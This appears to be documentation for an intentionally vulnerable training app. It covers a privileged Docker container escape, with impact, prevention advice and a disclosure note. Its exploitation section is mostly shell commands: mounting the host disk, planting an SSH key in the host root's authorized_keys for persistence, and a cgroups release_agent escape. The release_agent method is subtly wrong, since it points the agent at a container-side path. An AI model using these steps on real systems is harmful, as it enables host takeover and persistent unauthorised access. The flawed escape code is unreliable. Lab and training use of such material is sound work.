# Container Escape Vulnerability Documentation

## Overview

This document describes a high-severity security vulnerability in the HR Portal application: **privileged container escape**. This vulnerability has been intentionally implemented for educational and security testing purposes.

## Description

The HR Portal application is deployed in a Docker container with the `--privileged` flag enabled. This configuration provides the container with elevated privileges, essentially giving it near-equivalent capabilities to the host system. This is a significant security risk as it enables container escape attacks.

In a secure environment, containers should operate with the principle of least privilege, using only the permissions necessary for the application to function correctly.

## Impact

An attacker who gains access to a container with the `--privileged` flag can:

1. Access and modify the host file system
2. Access sensitive host devices
3. Install kernel modules
4. Potentially gain complete control of the host system
5. Pivot to other containers or systems in the network

## Exploitation Steps

Below is a step-by-step guide on how to exploit this vulnerability to escape from the container to the host system:

### Prerequisites
- Access to the container (e.g., through the RCE vulnerability in the employee upload feature)
- The container is running with the `--privileged` flag (confirmed)

### Method 1: Using Host Devices to Mount Host Filesystem

1. Once you have a shell in the container, verify you're in a privileged container:
```bash
ls -l /dev
cat /proc/self/status | grep CapEff
```

2. Create a temporary directory for mounting the host filesystem:
```bash
mkdir /tmp/host_root
```

3. Use the host's disk device to mount the host filesystem:
```bash
fdisk -l  # Find the main host partition, typically /dev/xvda1 or similar
mount /dev/xvda1 /tmp/host_root
```

4. Access the host's filesystem:
```bash
cd /tmp/host_root
ls -la
# Now you have access to the entire host filesystem
```

5. Establish persistence on the host:
```bash
# Add your SSH key to root's authorized_keys on the host
mkdir -p /tmp/host_root/root/.ssh
echo "YOUR_SSH_PUBLIC_KEY" >> /tmp/host_root/root/.ssh/authorized_keys
```

### Method 2: Using cgroups Release Agent (Advanced)

1. Create the necessary directories and files:
```bash
mkdir /tmp/escape
mount -t cgroup -o rdma cgroup /tmp/escape
mkdir /tmp/escape/x
echo 1 > /tmp/escape/x/notify_on_release
host_path=/tmp/escape/release_agent
echo '#!/bin/sh' > /tmp/payload
echo 'ps aux > /tmp/ps-host.txt' >> /tmp/payload  # Example command - write host process list to a file
chmod +x /tmp/payload
echo "/tmp/payload" > $host_path
chmod +x $host_path
```

2. Trigger the exploit:
```bash
sh -c "echo \$\$ > /tmp/escape/x/cgroup.procs"
```

3. Verify the exploit worked:
```bash
cat /tmp/ps-host.txt  # This should contain the host's process list
```

## Prevention Measures

To fix this vulnerability:

1. Remove the `--privileged` flag from all Docker run commands
2. Use specific capabilities with `--cap-add` only when required
3. Apply the principle of least privilege by only providing necessary access
4. Consider using security tools like AppArmor or SELinux
5. Implement container security scanning in CI/CD pipelines

## Responsible Disclosure

This vulnerability has been intentionally implemented for educational purposes. In a production environment, this would be considered a critical security issue requiring immediate remediation.

If you discover similar vulnerabilities in production systems, follow responsible disclosure procedures and report them to the appropriate security team. 